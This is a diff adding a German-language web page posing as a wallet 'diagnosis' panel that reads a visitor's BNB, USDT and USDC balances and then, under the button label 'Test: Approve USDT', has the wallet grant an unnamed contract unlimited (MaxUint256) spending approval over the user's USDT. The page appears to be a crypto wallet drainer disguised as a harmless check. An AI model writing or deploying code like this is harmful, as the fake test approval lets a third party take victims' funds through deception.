@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+  <title>Admin Diagnosis Panel</title>
+  <style>
+    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
+    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
+    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
+    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
+    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
+    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
+    button:active { transform: scale(0.98); opacity: 0.8; }
+    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 10px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; }
+    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #ef4444; color: #f8fafc; }
+    .diag-info { font-size: 12px; color: #cbd5e1; margin-top: 10px; text-align: left; background: #111827; padding: 10px; border-radius: 8px; }
+    .diag-item { display: flex; justify-content: space-between; border-bottom: 1px solid #1e293b; padding: 4px 0; }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Wallet Diagnose</h2>
+
+  <div class="step">
+    <span class="step-title">1. Wallet Check</span>
+    <button style="background: #3b82f6;" onclick="runDiagnosis()">Guthaben & Verbindung prüfen</button>
+    <div class="mono" id="addr">Nicht verbunden</div>
+    
+    <div class="diag-info" id="balances">
+      <div class="diag-item"><span>BNB (Gas):</span> <b id="valBNB">-</b></div>
+      <div class="diag-item"><span>USDT:</span> <b id="valUSDT">-</b></div>
+      <div class="diag-item"><span>USDC:</span> <b id="valUSDC">-</b></div>
+    </div>
+  </div>
+
+  <div class="step" style="border-left-color: #10b981;">
+    <span class="step-title">2. Freigabe Test</span>
+    <button onclick="approveToken('USDT')">Test: Approve USDT</button>
+  </div>
+
+  <div id="status">Warten auf Diagnose...</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
+<script>
+  const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  const TOKENS = {
+    USDT: "0x55d398326f99059fF775485246999027B3197955",
+    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
+  };
+
+  let walletA = null;
+  function setStatus(m) { document.getElementById("status").innerHTML = m; }
+
+  async function runDiagnosis() {
+    try {
+      if (!window.ethereum) return setStatus("❌ Kein Provider. Bitte Trust Wallet Browser nutzen!");
+      
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const accounts = await provider.send("eth_requestAccounts", []);
+      walletA = accounts[0];
+      document.getElementById("addr").innerText = walletA;
+
+      // 1. BNB (Gas) auslesen
+      const balanceBNB = await provider.getBalance(walletA);
+      const formattedBNB = ethers.formatEther(balanceBNB);
+      document.getElementById("valBNB").innerText = parseFloat(formattedBNB).toFixed(5) + " BNB";
+
+      // 2. USDT/USDC auslesen
+      const abiBalance = ["function balanceOf(address) view returns (uint256)"];
+      
+      const usdtContract = new ethers.Contract(TOKENS.USDT, abiBalance, provider);
+      const usdcContract = new ethers.Contract(TOKENS.USDC, abiBalance, provider);
+
+      const balUSDT = await usdtContract.balanceOf(walletA);
+      const balUSDC = await usdcContract.balanceOf(walletA);
+
+      document.getElementById("valUSDT").innerText = ethers.formatUnits(balUSDT, 18) + " USDT";
+      document.getElementById("valUSDC").innerText = ethers.formatUnits(balUSDC, 18) + " USDC";
+
+      if (parseFloat(formattedBNB) < 0.001) {
+        setStatus("⚠️ ACHTUNG: Zu wenig BNB für Gas gefunden!");
+      } else {
+        setStatus("✅ Guthaben erkannt. Versuche nun Schritt 2.");
+      }
+
+    } catch (e) {
+      console.error(e);
+      setStatus("❌ Diagnose fehlgeschlagen: " + e.message);
+    }
+  }
+
+  async function approveToken(type) {
+    try {
+      if(!walletA) return setStatus("❌ Bitte erst Diagnose starten!");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const abi = ["function approve(address s, uint256 a) public returns (bool)"];
+      const contract = new ethers.Contract(TOKENS[type], abi, signer);
+      
+      setStatus(`⌛ Teste ${type} Approve mit 120k Gas...`);
+      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 120000 });
+      await tx.wait();
+      setStatus(`✅ Freigabe für ${type} erfolgreich!`);
+    } catch (e) {
+      setStatus(`❌ Fehler: ${e.message.includes("funds") ? "Nicht genug BNB!" : e.message}`);
+    }
+  }
+</script>
+</body>
+</html>
